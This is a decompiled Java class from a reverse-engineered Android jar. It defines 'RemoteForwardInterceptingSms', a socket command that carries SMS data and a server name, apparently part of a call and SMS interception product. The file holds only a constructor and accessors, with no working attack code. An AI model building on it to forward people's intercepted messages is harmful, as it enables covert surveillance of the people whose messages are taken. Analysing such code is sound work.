package com.vvt.callmanager.ref.command;

import com.fx.socket.SocketCmd;
import com.vvt.sms.SmsInfo;

public class RemoteForwardInterceptingSms
  extends SocketCmd
{
  private static final long serialVersionUID = 5363611678192822520L;
  private String mServerName;
  
  public RemoteForwardInterceptingSms(SmsInfo paramSmsInfo, String paramString)
  {
    super(paramSmsInfo, Boolean.class);
    this.mServerName = paramString;
  }
  
  protected String getServerName()
  {
    return this.mServerName;
  }
  
  protected String getTag()
  {
    return "RemoteForwardInterceptingSms";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/vvt/callmanager/ref/command/RemoteForwardInterceptingSms.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */